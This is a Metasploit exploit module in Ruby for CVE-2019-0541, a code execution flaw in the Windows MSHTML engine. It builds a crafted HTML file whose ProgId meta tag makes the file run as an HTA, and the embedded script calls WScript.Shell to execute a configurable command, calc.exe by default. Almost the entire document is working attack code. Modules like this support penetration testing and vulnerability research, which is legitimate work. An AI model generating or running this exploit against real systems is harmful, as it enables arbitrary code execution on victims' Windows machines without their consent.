##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Microsoft Windows MSHTML Engine - "Edit" Remote Code Execution ',
      'Description'  => %q{
          The Microsoft Windows MSHTML Engine is prone to a vulnerability that allows attackers to execute arbitrary code on vulnerable systems because of improper validation of specially crafted web documents (html, xhtml, etc). The issue is triggered when users "Edit" specially crafted documents containing a 'meta' HTML tag set to 'ProgId' and its content set to a 'ProgId' of choice eg. 'HTAFILE', usually through MS IE browser or a MS Office component (The Edit HTML app 'msohtmed.exe'). Some Office versions will add an "Edit" menu option to html and xhtml files, making it possible to exploit the vulnerability locally or remotely (usually through network shares) This is the 'ProgId' exploit: Similar to the old Windows Shell / Internet Explorer ClassId vulnerabilit(ies) that haunted Windows 98/2000/XP in the past.'. On patched systems, the PoC file will always open in Notepad. 
          - Demo : https://youtu.be/OdEwBY7rXMw
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Eduardo Braun Prado ',            # Original discovery
          'Sungha Park <l4wk3r@gmail.com>',       # MSF module
        ],
      'References'  =>
        [
          [ 'OSVDB', '' ],
          [ 'EBD', '46536' ],
          [ 'CVE', '2019-0541' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'  => 'win',
      'Payload'   =>
        {
          'DisableNops' => true,
        },
      'Targets'   =>
        [
          [ 'Automatic', {} ],
          [ 'Internet Explore (unpatched)', {} ],
          [ 'MS Office', {} ],
        ],
      'DisclosureDate'  => 'March 13 2019',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'exploit.html']),
        OptString.new('COMMAND', [false, 'Command You Want to Execute.','calc.exe']),
        OptString.new('BODY', [false, 'Set HTML Body','<body>Hello World!!</body>'])
        
      ], self.class)

  end

  def exploit
    buf = "
<html>
<head><meta name=ProgId content=htafile>
<!-- htafile is just an exmaple of 'ProgId'...others are possible, you may test all available ProgIds at will! -->
</head>
<hta:application id=x>
<script>
try { if (x.commandLine != '') {
new ActiveXObject('WScript.Shell').Run('"
    buf << datastore['COMMAND']
    buf <<  "',1)
}
}
catch(ex){}
</script>
"
    buf << datastore['BODY']
    buf << "</html>"

    file_create(buf)
    handler
  end
end